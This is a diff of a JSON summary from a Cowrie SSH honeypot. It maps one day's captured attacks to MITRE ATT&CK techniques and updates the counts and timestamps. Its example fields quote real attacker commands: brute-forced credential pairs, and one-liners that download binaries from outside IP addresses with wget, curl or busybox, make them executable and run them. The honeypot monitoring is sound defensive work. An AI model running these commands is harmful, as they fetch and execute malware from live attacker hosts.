@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-04 19:03:11",
+  "generated": "2026-09-04 20:03:12",
   "totals": {
-    "commands": 1734,
-    "login_failed": 2998,
-    "login_success": 604,
-    "sessions": 3261
+    "commands": 2642,
+    "login_failed": 3558,
+    "login_success": 919,
+    "sessions": 3830
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2998,
+      "count": 3558,
       "examples": [
         "root / abcd12345",
         "admin / yess",
@@ -21,14 +21,14 @@
         "root / Arian"
       ],
       "first": "2026-09-04T00:00:06.722859Z",
-      "last": "2026-09-04T19:03:04.243557Z",
-      "unique_ips": 243
+      "last": "2026-09-04T20:03:07.386759Z",
+      "unique_ips": 248
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 604,
+      "count": 919,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "support / letmein",
@@ -37,14 +37,14 @@
         "root / "
       ],
       "first": "2026-09-04T00:10:27.211479Z",
-      "last": "2026-09-04T18:57:49.576166Z",
-      "unique_ips": 106
+      "last": "2026-09-04T20:03:04.903414Z",
+      "unique_ips": 119
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 72,
+      "count": 75,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-04T00:25:16.590506Z",
-      "last": "2026-09-04T17:58:43.280695Z",
-      "unique_ips": 12
+      "last": "2026-09-04T19:15:50.994513Z",
+      "unique_ips": 13
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 23,
+      "count": 27,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,14 +69,14 @@
         "nohup $SHELL -c \"curl http://120.26.66.176:8796/linux -o /tmp/jyv7FUoQeO; if [ ! -f /tmp/jyv7FUoQeO ]; then wget http://"
       ],
       "first": "2026-09-04T00:25:18.578399Z",
-      "last": "2026-09-04T17:58:43.280695Z",
-      "unique_ips": 8
+      "last": "2026-09-04T19:15:51.367325Z",
+      "unique_ips": 9
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 15,
+      "count": 16,
       "examples": [
         "uname -a",
         "/bin/./uname -s -v -n -r -m",
@@ -85,8 +85,8 @@
         "uname -s -v -n -r -m"
       ],
       "first": "2026-09-04T01:27:34.776778Z",
-      "last": "2026-09-04T17:47:11.267377Z",
-      "unique_ips": 9
+      "last": "2026-09-04T19:26:31.191217Z",
+      "unique_ips": 10
     },
     {
       "id": "T1033",
@@ -106,15 +106,17 @@
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 5,
+      "count": 7,
       "examples": [
         "nohup $SHELL -c \"curl http://120.26.66.176:8796/linux -o /tmp/jyv7FUoQeO; if [ ! -f /tmp/jyv7FUoQeO ]; then wget http://",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "sh -c 'cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/handshakebins.sh; busybox wget http",
+        "nohup cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/handshakebins.sh; busybox wget http:"
       ],
       "first": "2026-09-04T05:50:38.884319Z",
-      "last": "2026-09-04T17:47:11.267377Z",
-      "unique_ips": 5
+      "last": "2026-09-04T19:15:50.994513Z",
+      "unique_ips": 6
     },
     {
       "id": "T1070.004",
@@ -204,15 +206,15 @@
   "unmapped": [
     [
       "system",
-      499
+      800
     ],
     [
       "shell",
-      498
+      799
     ],
     [
       "sh",
-      498
+      799
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -224,7 +226,7 @@
     ],
     [
       "/bin/busybox UNSTABLE",
-      8
+      9
     ],
     [
       "linuxshell",
